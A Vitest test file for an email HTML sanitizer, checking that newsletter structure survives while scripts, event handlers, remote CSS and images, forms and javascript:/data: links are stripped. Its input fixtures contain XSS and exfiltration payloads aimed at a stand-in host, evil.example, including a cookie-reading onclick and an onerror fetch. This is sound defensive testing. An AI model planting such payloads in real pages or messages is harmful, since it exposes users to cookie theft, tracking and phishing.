import { describe, expect, it } from "vitest";
import { sanitizeMailHtml } from "./html-rendering.js";

describe("mail HTML rendering boundary", () => {
  it("keeps useful newsletter structure while removing execution, network, and navigation attacks", () => {
    const result = sanitizeMailHtml(`<!doctype html><html><head>
      <style>@import 'https://evil.example/css'; body { background:url(https://evil.example/bg) }</style>
      <script>window.parent.location='https://evil.example/script'</script></head><body>
      <h1 onclick="alert(document.cookie)">Weekly update</h1>
      <table><tr><th>Project</th><td><strong>Helix</strong></td></tr></table>
      <img src="https://evil.example/pixel" onerror="fetch('//evil.example')" alt="Chart">
      <a href="https://example.com/report" target="_parent">Read report</a>
      <a href="jav&#x61;script:alert(1)">Encoded attack</a>
      <a href="/internal">Relative attack</a>
      <form action="https://evil.example/form"><input name="secret"></form>
      <blockquote>Earlier message</blockquote></body></html>`);

    expect(result.remoteContentBlocked).toBe(true);
    expect(result.html).toContain("<h1>Weekly update</h1>");
    expect(result.html).toContain(
      "<table><tr><th>Project</th><td><strong>Helix</strong></td></tr></table>",
    );
    expect(result.html).toContain('<img alt="Chart"/>');
    expect(result.html).toContain(
      '<a href="#helix-link" data-helix-href="https://example.com/report">Read report</a>',
    );
    expect(result.html).toContain("<a>Encoded attack</a>");
    expect(result.html).toContain("<a>Relative attack</a>");
    expect(result.html).toContain("<blockquote>Earlier message</blockquote>");
    expect(result.html).not.toMatch(
      /script|onclick|onerror|style|@import|url\s*\(|form|input|target/iu,
    );
    expect(result.html).not.toContain("evil.example");
    expect(result.html).not.toContain("document.cookie");
  });

  it("allows only explicit web and mail links", () => {
    const { html } = sanitizeMailHtml(`
      <a href="HTTP://example.com">web</a>
      <a href="mailto:help@example.com">mail</a>
      <a href=" data:text/html,attack">data</a>
      <a href=" java\nscript:alert(1)">control</a>
    `);
    expect(html).toContain('data-helix-href="HTTP://example.com"');
    expect(html).toContain('data-helix-href="mailto:help@example.com"');
    expect(html).not.toMatch(/href="(?:data|java)/iu);
  });
});
